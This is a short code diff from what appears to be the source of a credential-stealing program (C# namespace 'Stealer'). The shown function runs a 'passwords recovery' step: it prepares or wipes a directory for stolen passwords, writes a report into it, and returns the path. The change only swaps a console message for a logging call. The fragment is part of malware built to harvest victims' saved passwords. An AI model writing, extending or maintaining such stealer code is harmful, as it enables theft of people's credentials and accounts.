@@ -16,7 +16,7 @@ namespace Stealer
         {
             Console.WriteLine("Running passwords recovery...");
             if (!Directory.Exists(PasswordsStoreDirectory)) Directory.CreateDirectory(PasswordsStoreDirectory);
-            else try { Filemanager.RecursiveDelete(PasswordsStoreDirectory); } catch { Console.WriteLine("Failed recursive remove directory");  };
+            else try { Filemanager.RecursiveDelete(PasswordsStoreDirectory); } catch { Logging.Log("Stealer >> Failed recursive remove directory with passwords");  };
             
             if (Report.CreateReport(PasswordsStoreDirectory))
                 return PasswordsStoreDirectory;
